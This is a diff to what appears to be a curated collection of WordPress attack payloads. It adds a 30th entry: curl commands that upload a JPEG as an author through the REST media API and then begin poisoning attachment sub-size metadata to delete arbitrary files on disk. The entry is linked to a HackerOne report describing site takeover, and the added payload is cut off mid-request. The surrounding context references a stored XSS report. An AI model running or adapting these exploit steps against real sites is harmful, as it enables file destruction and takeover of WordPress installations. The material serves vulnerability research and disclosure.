@@ -1,6 +1,6 @@
 # WordPress
 
-29 payloads.
+30 payloads.
 
 ### `e92a92b1`
 
@@ -270,3 +270,22 @@ if(document.location.hash.indexOf("secret") != -1) {
 ```
 
 — [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)
+
+### `7680439f`
+
+```
+AP=<author1 application password>
+B=http://localhost:8356
+
+# [1] Author uploads a real JPEG
+curl -u "author1:$AP" -H "Content-Disposition: attachment; filename=zap4.jpg" \
+     -H "Content-Type: image/jpeg" --data-binary @zap.jpg \
+     -X POST "$B/?rest_route=/wp/v2/media"                       # 201, id=8
+
+# [2] Poison one sub-size filename with the name of the file to destroy
+curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \
+  -d '{"sub_sizes":[{"image_size":"thumbnail","fil
+```
+
+**Parameter:** `file`
+— [Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`](https://hackerone.com/reports/3931777) · WordPress · [jakubk](https://hackerone.com/jakubk)
